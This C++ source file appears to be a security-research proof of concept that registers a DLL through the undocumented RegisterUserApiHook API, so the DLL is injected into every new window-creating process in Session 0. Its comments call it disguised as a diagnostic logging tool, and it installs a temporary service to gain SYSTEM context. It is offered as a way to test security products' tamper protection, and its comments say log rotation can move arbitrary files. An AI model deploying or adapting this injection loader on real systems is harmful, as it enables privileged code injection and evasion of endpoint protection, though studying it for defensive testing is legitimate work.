// This is a demo of RegisterUserApiHook, disguised as a diagnostic loggic tool.
// RegisterUserApiHook requires NT AUTHORITY/SYSTEM unrestrcited token and SeTcbPrivilege enabled.

// Whenever the diag.dll gets injected into a new process in Session 0, its PID and command line are
// logged in the log file (location and name configurable).
// If combined with the logrotate option, this can be used to move artbirary files.
// Which becomes helpful at evaluating tamper-protect logic of individual security products.

// Author: Julian Horoszkiewicz (Atos Threat Research Center)

// Build (or just run build.bat):
// "c:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
// rc /nologo /fo uxdiag.res uxdiag.rc
// cl /nologo /W3 /EHsc uxdiag.cpp /Fe:uxdiag.exe /link /MACHINE:X64 shlwapi.lib advapi32.lib uxdiag.res

#define UNICODE
#define _UNICODE
#include <windows.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <shlwapi.h>

#include "scope.h"

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")

// --------------------------------------------------------------------------
// RegisterUserApiHook -- undocumented user32 export
//
// win32kfull!_RegisterUserApiHook checks, in order:
//   1. IsInsideUserApiHook()  -- session+0xff80 != -1 (hook already registered)
//   2. IsRestricted(thread)   -- SeTokenIsRestricted(process token)
//   3. W32Process+0x300 == SYSTEM_LUID (0x3e7)
//   4. HasTcbPrivilege()
// Any failure -> ERROR_ACCESS_DENIED (5).
// --------------------------------------------------------------------------

#pragma pack(push, 8)
struct USERAPIHOOKINFO
{
    DWORD   Size;
    DWORD   _pad;
    LPCWSTR DllPath;
    LPCWSTR ProcName;
    LPCWSTR DllPathWow;
    LPCWSTR ProcNameWow;
};
#pragma pack(pop)

typedef BOOL (WINAPI *PFN_RegisterUserApiHook)(const USERAPIHOOKINFO*);
typedef BOOL (WINAPI *PFN_UnregisterUserApiHook)(void);

static WCHAR g_dllPath[MAX_PATH];
static WCHAR g_logDir[MAX_PATH] = L"C:\\Users\\Public";
static WCHAR g_logName[MAX_PATH] = L"DIAG.log";
static BOOL g_logRotate = FALSE;
static WCHAR g_scope[SCOPE_LIST_MAX] = {};  // comma-separated list; empty -> no restriction (all processes)
static HANDLE g_logFile = INVALID_HANDLE_VALUE;

// ---- Logging: tee to console + file ----

static void LogInit()
{
    WCHAR logPath[MAX_PATH];
    _snwprintf_s(logPath, _TRUNCATE, L"%s\\uxdiag.log", g_logDir);
    g_logFile = CreateFileW(logPath, FILE_APPEND_DATA,
                            FILE_SHARE_READ | FILE_SHARE_WRITE,
                            NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
}

static void LogClose()
{
    if (g_logFile != INVALID_HANDLE_VALUE)
    {
        CloseHandle(g_logFile);
        g_logFile = INVALID_HANDLE_VALUE;
    }
}

static void Log(const WCHAR* fmt, ...)
{
    WCHAR buf[1024];
    va_list ap;
    va_start(ap, fmt);
    _vsnwprintf_s(buf, _TRUNCATE, fmt, ap);
    va_end(ap);

    wprintf(L"%s", buf);

    if (g_logFile != INVALID_HANDLE_VALUE)
    {
        // Write as UTF-8 to the log file
        char utf8[2048];
        int n = WideCharToMultiByte(CP_UTF8, 0, buf, -1, utf8, sizeof(utf8), NULL, NULL);
        if (n > 1)
        {
            DWORD written;
            WriteFile(g_logFile, utf8, n - 1, &written, NULL);
        }
    }
}

// ---- Read diag.conf from the directory containing the hook DLL ----
//
// Format: one "key=value" per line; blank lines and '#' comments are ignored,
// whitespace around keys/values is trimmed, key match is case-insensitive.
// Keys: logdir, logname, logrotate, scope. Missing file or keys -> built-in defaults.

static BOOL ReadConfValue(const WCHAR* confPath, const char* key, WCHAR* out, int outChars)
{
    HANDLE hFile = CreateFileW(confPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;

    char buf[4096] = {};
    DWORD bytesRead = 0;
    ReadFile(hFile, buf, sizeof(buf) - 1, &bytesRead, NULL);
    CloseHandle(hFile);

    char* save = NULL;
    for (char* line = strtok_s(buf, "\n", &save); line; line = strtok_s(NULL, "\n", &save))
    {
        while (*line == ' ' || *line == '\t' || *line == '\r')
            line++;
        if (*line == '\0' || *line == '#')
            continue;

        char* eq = strchr(line, '=');
        if (!eq)
            continue;
        *eq = '\0';

        char* kEnd = eq;
        while (kEnd > line && (kEnd[-1] == ' ' || kEnd[-1] == '\t'))
            *--kEnd = '\0';

        if (_stricmp(line, key) != 0)
            continue;

        char* val = eq + 1;
        while (*val == ' ' || *val == '\t')
            val++;
        size_t vLen = strlen(val);
        while (vLen > 0 && (val[vLen - 1] == ' ' || val[vLen - 1] == '\t' || val[vLen - 1] == '\r'))
            val[--vLen] = '\0';

        MultiByteToWideChar(CP_UTF8, 0, val, -1, out, outChars);
        return TRUE;
    }
    return FALSE;
}

static void LoadConfig()
{
    WCHAR confPath[MAX_PATH];
    wcscpy_s(confPath, g_dllPath);
    WCHAR* slash = wcsrchr(confPath, L'\\');
    if (slash)
        wcscpy_s(slash + 1, MAX_PATH - (slash + 1 - confPath), L"diag.conf");
    else
    {
        Log(L"[!] Cannot locate diag.conf next to DLL -- using defaults\n");
        return;
    }

    if (GetFileAttributesW(confPath) == INVALID_FILE_ATTRIBUTES)
    {
        Log(L"[!] diag.conf not found: %s -- using defaults\n", confPath);
        return;
    }

    WCHAR val[MAX_PATH] = {};
    if (ReadConfValue(confPath, "logdir", val, sizeof(val) / sizeof(WCHAR)))
    {
        wcscpy_s(g_logDir, val);
        size_t len = wcslen(g_logDir);
        if (len > 0 && g_logDir[len - 1] == L'\\')
            g_logDir[len - 1] = L'\0';
    }

    if (ReadConfValue(confPath, "logname", val, sizeof(val) / sizeof(WCHAR)))
    {
        wcscpy_s(g_logName, val);
        // Only the file name portion is used (no directories allowed)
        const WCHAR* base = PathFindFileNameW(g_logName);
        if (base != g_logName)
            memmove(g_logName, base, (wcslen(base) + 1) * sizeof(WCHAR));
    }

    g_logRotate = FALSE;
    WCHAR rot[MAX_PATH] = {};
    if (ReadConfValue(confPath, "logrotate", rot, sizeof(rot) / sizeof(WCHAR)) && wcscmp(rot, L"0") != 0)
        g_logRotate = TRUE;

    // scope: optional comma-separated image file name filter for the hook DLL's logging
    g_scope[0] = L'\0';
    ReadConfValue(confPath, "scope", g_scope, sizeof(g_scope) / sizeof(WCHAR));
}

// ---- Privilege helpers ----

static BOOL EnablePrivilege(LPCWSTR privName)
{
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!LookupPrivilegeValueW(NULL, privName, &tp.Privileges[0].Luid))
    {
        CloseHandle(hToken);
        return FALSE;
    }

    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD err = GetLastError();
    CloseHandle(hToken);
    return ok && err == ERROR_SUCCESS;
}

static void PrintDiagnostics()
{
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        Log(L"[!] Cannot query the current identity\n");
        return;
    }

    TOKEN_STATISTICS stats;
    DWORD len;
    if (GetTokenInformation(hToken, TokenStatistics, &stats, sizeof(stats), &len))
    {
        Log(L"[*] Identity: 0x%lx:0x%lx\n",
            stats.AuthenticationId.HighPart, stats.AuthenticationId.LowPart);
        if (stats.AuthenticationId.LowPart == 0x3E7 && stats.AuthenticationId.HighPart == 0)
            Log(L"[+] Required identity present\n");
        else
            Log(L"[!] Required identity missing -- the call will fail\n");
    }

    BOOL isLimited = IsTokenRestricted(hToken);
    if (isLimited)
        Log(L"[!] Identity is limited -- the call will fail\n");
    else
        Log(L"[+] Identity is full\n");

    DWORD sessionId = 0;
    if (GetTokenInformation(hToken, TokenSessionId, &sessionId, sizeof(sessionId), &len))
        Log(L"[*] Session ID: %lu\n", sessionId);

    CloseHandle(hToken);

    DWORD procSessionId = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &procSessionId);
    Log(L"[*] Process session ID: %lu\n", procSessionId);
}

// ---- Service-mode support ----

static SERVICE_STATUS_HANDLE g_svcHandle;
static HANDLE g_svcStopEvent;
static PFN_UnregisterUserApiHook g_pfnUnregister;

static DWORD WINAPI SvcCtrlHandler(DWORD ctrl, DWORD, LPVOID, LPVOID)
{
    if (ctrl == SERVICE_CONTROL_STOP)
    {
        if (g_pfnUnregister)
            g_pfnUnregister();

        SERVICE_STATUS ss = {};
        ss.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
        ss.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(g_svcHandle, &ss);
        SetEvent(g_svcStopEvent);
        return NO_ERROR;
    }
    return ERROR_CALL_NOT_IMPLEMENTED;
}

static BOOL DoRegisterHook()
{
    EnablePrivilege(SE_TCB_NAME);

    HMODULE hUser32 = LoadLibraryW(L"user32.dll");
    if (!hUser32) { Log(L"[-] LoadLibrary user32 failed\n"); return FALSE; }

    auto pfnRegister = (PFN_RegisterUserApiHook)
        GetProcAddress(hUser32, "RegisterUserApiHook");
    g_pfnUnregister = (PFN_UnregisterUserApiHook)
        GetProcAddress(hUser32, "UnregisterUserApiHook");
    if (!pfnRegister) { Log(L"[-] API not found\n"); return FALSE; }

    Log(L"[+] RegisterUserApiHook @ %p\n", pfnRegister);

    if (g_pfnUnregister)
    {
        if (g_pfnUnregister())
            Log(L"[+] Previous routine unregistered\n");
        else
            Log(L"[!] UnregisterUserApiHook failed (%lu)\n", GetLastError());
    }

    USERAPIHOOKINFO info = {};
    info.Size        = 0x28;
    info.DllPath     = g_dllPath;
    info.ProcName    = L"StartLog";
    info.DllPathWow  = g_dllPath;
    info.ProcNameWow = L"StartLog";

    Log(L"[*] Calling RegisterUserApiHook...\n");
    BOOL ok = pfnRegister(&info);
    if (ok)
        Log(L"[+] SUCCESS -- routine registered for this session\n");
    else
        Log(L"[-] RegisterUserApiHook FAILED (error %lu)\n", GetLastError());
    return ok;
}

static void WINAPI ServiceMain(DWORD, LPWSTR*)
{
    g_svcHandle = RegisterServiceCtrlHandlerExW(L"UxDiag", SvcCtrlHandler, NULL);
    g_svcStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);

    SERVICE_STATUS ss = {};
    ss.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ss.dwCurrentState = SERVICE_RUNNING;
    ss.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    SetServiceStatus(g_svcHandle, &ss);

    LogInit();
    Log(L"[svc] Running diagnostics...\n");
    PrintDiagnostics();
    DoRegisterHook();

    WaitForSingleObject(g_svcStopEvent, INFINITE);
    LogClose();
}

static int RunAsService()
{
    SERVICE_TABLE_ENTRYW table[] = {
        { (LPWSTR)L"UxDiag", ServiceMain },
        { NULL, NULL }
    };
    if (!StartServiceCtrlDispatcherW(table))
    {
        DWORD err = GetLastError();
        if (err == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT)
            return -1;
        return 1;
    }
    return 0;
}

static BOOL InstallAndRunService()
{
    WCHAR exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    // The service reads diag.conf from next to the hook DLL itself.
    WCHAR cmdLine[MAX_PATH * 3];
    _snwprintf_s(cmdLine, _TRUNCATE, L"\"%s\" --svc \"%s\"", exePath, g_dllPath);

    SC_HANDLE hScm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hScm)
    {
        Log(L"[-] OpenSCManager failed (%lu). Run as administrator.\n", GetLastError());
        return FALSE;
    }

    SC_HANDLE hSvc = OpenServiceW(hScm, L"UxDiagSvc", SERVICE_ALL_ACCESS);
    if (hSvc)
    {
        SERVICE_STATUS svcSs;
        ControlService(hSvc, SERVICE_CONTROL_STOP, &svcSs);
        Sleep(500);
        DeleteService(hSvc);
        CloseServiceHandle(hSvc);
        hSvc = NULL;
        Sleep(200);
    }

    hSvc = CreateServiceW(hScm, L"UxDiagSvc", L"UxDiag Service",
                          SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
                          SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
                          cmdLine, NULL, NULL, NULL, NULL, NULL);
    if (!hSvc)
    {
        Log(L"[-] CreateService failed (%lu)\n", GetLastError());
        CloseServiceHandle(hScm);
        return FALSE;
    }

    Log(L"[+] Service created. Starting...\n");
    if (!StartServiceW(hSvc, 0, NULL))
    {
        Log(L"[-] StartService failed (%lu)\n", GetLastError());
        DeleteService(hSvc);
        CloseServiceHandle(hSvc);
        CloseServiceHandle(hScm);
        return FALSE;
    }

    Sleep(2000);
    Log(L"[+] Service is running -- routine is active in the service session.\n");
    Log(L"[*] All new window-creating processes in that session will use the routine.\n");
    Log(L"[*] Check %s\\%s for output.\n", g_logDir, g_logName);
    Log(L"[*] Press Enter to stop and clean up...\n");
    getwchar();

    SERVICE_STATUS svcSs;
    ControlService(hSvc, SERVICE_CONTROL_STOP, &svcSs);
    Sleep(500);
    DeleteService(hSvc);
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hScm);
    Log(L"[+] Service stopped and removed.\n");
    return TRUE;
}

// ---- Argument parsing ----

static void ParseArgs(int argc, wchar_t* argv[])
{
    BOOL dllPathSet = FALSE;
    for (int i = 1; i < argc; i++)
    {
        if (wcscmp(argv[i], L"--svc") == 0)
            continue;  // handled separately
        if (!dllPathSet)
        {
            GetFullPathNameW(argv[i], MAX_PATH, g_dllPath, NULL);
            dllPathSet = TRUE;
        }
    }

    if (!dllPathSet)
    {
        GetModuleFileNameW(NULL, g_dllPath, MAX_PATH);
        PathRemoveFileSpecW(g_dllPath);
        wcscat_s(g_dllPath, L"\\diag.dll");
    }
}

int wmain(int argc, wchar_t* argv[])
{
    // ---- Service entry point (invoked by SCM) ----
    if (argc >= 3 && wcscmp(argv[1], L"--svc") == 0)
    {
        wcscpy_s(g_dllPath, argv[2]);
        LoadConfig();
        return RunAsService();
    }

    // ---- Parse arguments ----
    ParseArgs(argc, argv);

    if (GetFileAttributesW(g_dllPath) == INVALID_FILE_ATTRIBUTES)
    {
        wprintf(L"[-] DLL not found: %s\n", g_dllPath);
        return 1;
    }

    // Load logdir/logname/logrotate from diag.conf next to the hook DLL
    LoadConfig();

    // Ensure log directory exists
    CreateDirectoryW(g_logDir, NULL);
    LogInit();

    Log(L"[*] DLL path: %s\n", g_dllPath);
    Log(L"[*] Log dir:  %s\n", g_logDir);
    Log(L"[*] DIAG log: %s\\%s\n", g_logDir, g_logName);
    Log(L"[*] Log rotate: %s\n", g_logRotate ? L"on" : L"off");
    if (g_scope[0])
    {
        int n = ScopeCountEntries(g_scope);
        Log(L"[*] Scope:    %s (only these %d image%s will log)\n",
            g_scope, n, (n == 1) ? L"" : L"s");
    }
    else
        Log(L"[*] Scope:    (none -- all processes log)\n");

    // ---- Print diagnostic info ----
    Log(L"\n=== Identity diagnostics ===\n");
    PrintDiagnostics();
    EnablePrivilege(SE_TCB_NAME);

    // ---- First try direct registration ----
    Log(L"\n=== Trying direct registration ===\n");
    if (DoRegisterHook())
    {
        Log(L"[*] Press Enter to unregister and exit...\n");
        getwchar();
        if (g_pfnUnregister) g_pfnUnregister();
        Log(L"[+] Unregistered. Exiting.\n");
        LogClose();
        return 0;
    }

    // ---- Fall back to service-based registration ----
    Log(L"\n=== Direct registration failed -- falling back to service ===\n");
    Log(L"[*] The fallback service runs with a full identity.\n\n");

    BOOL ok = InstallAndRunService();
    LogClose();

    if (ok) return 0;

    wprintf(L"\n[-] All methods failed.\n");
    return 1;
}
